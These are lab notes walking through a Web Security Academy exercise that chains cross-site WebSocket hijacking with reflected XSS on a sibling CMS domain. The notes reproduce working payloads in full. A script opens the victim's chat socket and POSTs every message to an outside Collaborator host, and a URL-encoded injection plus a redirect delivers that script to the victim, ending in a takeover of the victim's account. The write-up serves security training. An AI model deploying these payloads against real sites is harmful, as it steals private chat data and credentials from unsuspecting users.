```bash

1. navigate to the live chat
2. chat
3. navigate to the HTTP history: /chat  --  RESPONSE  HTTP/1.1 101 Switching Protocol
                                                     Connection: Upgrade
                                                     Upgrade: websocket
                                                     Sec-WebSocket-Accept: 0o10Sjg+aWXHxmkkVLxcjdQcfNA=
                                                     
4. click on the WebSockets history  --  you can see the messages  &&  how it worked

STUDY  --  LIVE CHAT FEATURE
Navigate to Proxy > WebSockets history. 
When you refresh the page, you'll see the browser sends a READY message to the server, prompting the server to return the full chat history.    

CONFIRM THE CROSS-SITE WEBSOCKET HIJACKING VULNERABILITY
1. In Burp Suite, open the Collaborator tab and click Copy to clipboard to generate a new Collaborator payload. 
   It will be automatically copied to your clipboard.
   
2. In your browser, navigate to the exploit server and use the following template to craft a script demonstrating a Cross-Site WebSocket Hijacking 
   (CSWSH) PoC
   
 <script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>     


3. store and view the exploit to test it by yourself.

4. in Burp Suite, return to the Collaborator tab and click Poll now. You should see an HTTP interaction, confirming that a new live chat connection 
   was established with the target site.
   
5. note that while this confirms the CSWSH vulnerability, it only exfiltrates the chat history from a new session, 
   which isn't very useful from an attacker's perspective.     
   
CONCLUSION
a. because of the Samesite=strict protection: browser didn't send the cookie

b. in order to exploit we need to execute our JS PAYLOAD  --  XSS  --  find: XSS  --  tried every input point: XSS failed

c. while initiating the first live chat their is a file named /resources/js/chat.js : also loaded: this can be seen in the HTTP history
   INTERESTING URL IN THE RESPONSE
   https://cms-lab-id.web-security-academy.net
   
d. navigate to the site  --  try XSS
                             XSS CONFIRMED
                             
6. send to repeater  &&  change the method form POST to GET   

7. url encode this script

 <script>
    var ws = new WebSocket('wss://lab-id.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
 </script>  
 
8. copy and then paste: XSS injection point  --  repeater tab  

   GET /login?username=%20%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d
%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%6c%61%62%2d%69%64%77
   %65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27
   %29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29
   %20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a
   %20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e
   %63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28
   %27%68%74%74%70%73%3a%2f%2f%62%75%72%70%2d%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2d%6c%69
   %6e%6b%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f
   %53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65
   %76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e%20&password=mango
   
9. right click: click copy URL

10. navigate to the exploit server

PAYLOAD

 <script>
    document.location='https://cms-0a78002d0405eda380bb120800320050.web-security-academy.net/login?username=%20%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%37%38%30%30%32%64%30%34%30%35%65%64%61%33%38%30%62%62%31%32%30%38%30%30%33%32%30%30%35%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6a%67%33%38%74%38%37%6c%66%6b%61%73%6b%78%70%31%30%62%72%63%78%68%70%6d%62%64%68%34%35%77%74%6c%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%20%3c%2f%73%63%72%69%70%74%3e%20&password=apple'
</script>     

11. deliver to victim  &&  pull now your request: collaborator  
12. check the RESPONSE &&  login  &&  done

```
